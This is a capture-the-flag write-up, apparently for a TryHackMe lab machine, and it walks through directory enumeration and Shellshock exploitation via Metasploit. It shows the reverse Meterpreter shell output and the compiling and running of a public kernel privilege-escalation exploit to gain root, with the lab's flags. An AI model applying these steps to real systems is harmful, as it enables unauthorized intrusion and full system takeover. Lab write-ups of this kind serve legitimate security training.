# writeups

```
/cgi-bin              (Status: 301) [Size: 313] [--> http://10.10.41.239/cgi-bin/]
/img                  (Status: 301) [Size: 309] [--> http://10.10.41.239/img/]
/uploads              (Status: 301) [Size: 313] [--> http://10.10.41.239/uploads/]
/admin                (Status: 301) [Size: 311] [--> http://10.10.41.239/admin/]
/css                  (Status: 301) [Size: 309] [--> http://10.10.41.239/css/]
/js                   (Status: 301) [Size: 308] [--> http://10.10.41.239/js/]
/backup               (Status: 301) [Size: 312] [--> http://10.10.41.239/backup/]
/secret 
```
http://10.10.41.239/secret/, the unique indice I got it was "Turtles?", in the title
but let's keep seeing. so nikto gave me that 
`/cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability`, after 
that I use metasploit to look for metasploit tool, and I got one and I found some 
interesting stuff like that,
```
msf6 auxiliary(scanner/http/apache_mod_cgi_bash_env) > run

[+] uid=33(www-data) gid=33(www-data) groups=33(www-data)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
`www-data`, it's the username of the webapp maybe we can got a webshell with this,
so after that what if we look for other tool to exploit this vuln.

I found an exploit,
```
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > check
[+] 10.10.41.239:80 - The target is vulnerable.
```
and I also check if it's vulnerable with this tool and it's vulnerable; and after while
for config the exploit I got the meterpreter
```
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit

[*] Started reverse TCP handler on 10.8.91.36:4444 
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (1017704 bytes) to 10.10.41.239
[*] Meterpreter session 1 opened (10.8.91.36:4444 -> 10.10.41.239:34261) at 2023-03-29 18:06:09 -0400

meterpreter > 
```
After that I go to ryan home, a user and got the 1st flag
`THM{Sh3llSh0ck_r0ckz}` now let's look for root flag. After getting connected I came back to the
hint that said it's an old OS, so I think maybe checking the os version and loook what I found
`Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux`
let's look if there's any exploit, and there `https://www.exploit-db.com/exploits/37292`, the right
exploit, after that I to compiled it and exec it, and here we go I got the root priv

```
www-data@ubuntu:/tmp$ gcc pocExploit.c -o hill
gcc pocExploit.c -o hill
www-data@ubuntu:/tmp$ ./hill
```
and here the flag
`THM{g00d_j0b_0day_is_Pleased}`


credit1 : https://null-byte.wonderhowto.com/how-to/exploit-shellshock-web-server-using-metasploit-0186084/
good resource to know about shellshock vuln and how to exploit it

credit2 : https://vaishnavpardhi.blogspot.com/2020/10/0day-tryhackme.html
this writeups it's not too bad if you get stuck, I used it when I stuck to find the right exploit
